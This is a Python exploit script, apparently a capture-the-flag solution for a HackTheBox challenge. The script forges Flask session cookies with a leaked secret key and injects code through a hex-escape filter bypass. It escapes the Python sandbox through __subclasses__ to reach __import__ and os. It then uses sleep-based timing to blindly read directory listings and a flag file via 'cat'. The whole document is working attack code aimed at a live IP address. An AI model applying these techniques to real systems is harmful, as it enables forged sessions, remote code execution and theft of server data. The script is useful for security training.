
import flask_unsign
import requests
import time
import sys
from pwn import *

url = "http://138.68.141.81:30995/"
SECRET_KEY = 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw'

count = ['first', 'second', 'third']
file_name, flag = ['', '', ''], 'HTB{'
filtering =  ['[', '(', '_', '.']
bypass = []

for i in range(len(filtering)):
    bypass.append(str(hex(ord(filtering[i]))).replace("0", "\\"))

def h(s):
    for i in range(len(bypass)):
        s = s.replace(filtering[i], bypass[i])
    return s
    
def GET_length(u, c, a, s):
    cookies = {'session':c}
    first_time = time.time()
    requests.get(u, cookies=cookies)
    if time.time() - first_time > 2.8:
        log.info("The token is " + c)
        log.info("It took {} seconds".format(time.time() - first_time))
        log.info(s + str(a))
        return 1

def GET_filename(u, c, i, a, m):
    global file_name, flag
    cookies = {'session':c}
    first_time = time.time()
    requests.get(u, cookies=cookies)
    if time.time() - first_time > 2.8:
        if m == 1:
            file_name[i] += chr(a)
            return 1
        else:
            flag += chr(a)
    
for i in range(1, 300):
    pay = '''1
exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\nif i('os').listdir('./').__len__()==''' + str(i) + ''':i('time').sleep(3)"'''
    pay = h(pay)
    token = flask_unsign.sign({'ingredient':'i', 'measurements':pay}, SECRET_KEY)
    if (GET_length(url, token, i, "The count of files is ")):
        break

    ## The length is 3. It is means the count of files is 3

for i in range(len(count)):
    for j in range(1, 300):
        pay = '''1
exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\nif i('os').listdir('./')[''' + str(i) + '''].__len__()==''' + str(j) + ''':i('time').sleep(3)"'''
        pay = h(pay)
        token = flask_unsign.sign({'ingredient':'i', 'measurements':pay}, SECRET_KEY)
        if (GET_length(url, token, j, f"The {count[i]} file length is ")):
            break

f_length = [6, 9, 34]
for i in range(3):
    for j in range(f_length[i]):
        for k in range(33, 128):
            pay = '''1
exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\nif i('os').listdir('./')[''' + str(i) + '''][''' + str(j) + ''']==\'''' + chr(k) + '''\':i('time').sleep(3)"'''
            pay = h(pay)
            token = flask_unsign.sign({'ingredient':'i', 'measurements':pay}, SECRET_KEY)
            if (GET_filename(url, token, i, k, 1)):
                break

for i in range(1, 300):
    pay = '''1
exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\nif i('os').popen('cat to*').read().__len__()==''' + str(i) + ''':i('time').sleep(3)"'''
    log.info("The payload is " + pay)
    pay = h(pay)
    token = flask_unsign.sign({'ingredient':'i', 'measurements':pay}, SECRET_KEY)
    if (GET_length(url, token, i, "The flag length is ")):
        break

# Get the flag
for i in range(4, 51):
    for j in range(33, 128):
        pay = '''1
exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\nif i('os').popen('cat to*').read()[''' + str(i) + ''']==\'''' + chr(j) + '''\':i('time').sleep(3)"'''
        pay = h(pay)
        token = flask_unsign.sign({'ingredient':'i', 'measurements':pay}, SECRET_KEY)
        if (GET_filename(url, token, None, j, 0)):
            break
            
log.info("The flag is " + flag)
